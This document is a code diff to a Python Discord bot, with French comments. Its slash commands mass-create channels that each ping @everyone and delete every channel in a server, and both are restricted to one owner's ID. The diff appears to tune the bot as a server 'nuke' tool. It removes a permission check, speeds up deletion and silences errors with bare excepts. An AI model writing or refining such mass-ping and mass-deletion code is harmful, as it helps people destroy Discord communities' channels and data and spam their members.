@@ -16,15 +16,12 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 
 # =========================
-# LOCK GLOBAL (TON ID UNIQUEMENT)
+# CHECK OWNER ONLY
 # =========================
 def is_me(interaction: discord.Interaction) -> bool:
     return interaction.user.id == MY_ID
 
 
-# =========================
-# READY
-# =========================
 @bot.event
 async def on_ready():
     await bot.tree.sync()
@@ -102,12 +99,15 @@ async def createsalons(
 
     async def create_channel(i):
         async with semaphore:
-            channel = await guild.create_text_channel(
-                name=f"{nom}-{i + 1}",
-                category=categorie
-            )
             try:
-                await channel.send("@everyone")
+                channel = await guild.create_text_channel(
+                    name=f"{nom}-{i + 1}",
+                    category=categorie
+                )
+                try:
+                    await channel.send("@everyone")
+                except:
+                    pass
             except:
                 pass
 
@@ -134,7 +134,6 @@ async def createsalons(
     description="Supprime tous les salons du serveur"
 )
 @app_commands.check(is_me)
-@app_commands.checks.has_permissions(manage_channels=True)
 async def delete_all_channels(interaction: discord.Interaction):
 
     guild = interaction.guild
@@ -144,10 +143,10 @@ async def delete_all_channels(interaction: discord.Interaction):
         ephemeral=True
     )
 
-    for channel in guild.channels:
+    for channel in list(guild.channels):
         try:
             await channel.delete()
-            await asyncio.sleep(0.2)
+            await asyncio.sleep(0.15)
         except:
             pass
 
@@ -158,24 +157,16 @@ async def delete_all_channels(interaction: discord.Interaction):
 
 
 # =========================
-# ERROR HANDLER
+# GLOBAL ERROR HANDLER (PROPRE)
 # =========================
-@createsalons.error
-async def createsalons_error(interaction, error):
-    if isinstance(error, app_commands.CheckFailure):
-        await interaction.response.send_message(
-            "❌ Tu n’as pas accès à cette commande.",
-            ephemeral=True
-        )
+@bot.tree.error
+async def on_app_command_error(interaction: discord.Interaction, error):
 
-
-@delete_all_channels.error
-async def delete_error(interaction, error):
     if isinstance(error, app_commands.CheckFailure):
-        await interaction.response.send_message(
-            "❌ Tu n’as pas accès à cette commande.",
-            ephemeral=True
-        )
+        if interaction.response.is_done():
+            await interaction.followup.send("❌ Accès refusé.", ephemeral=True)
+        else:
+            await interaction.response.send_message("❌ Accès refusé.", ephemeral=True)
 
 
 bot.run(TOKEN)
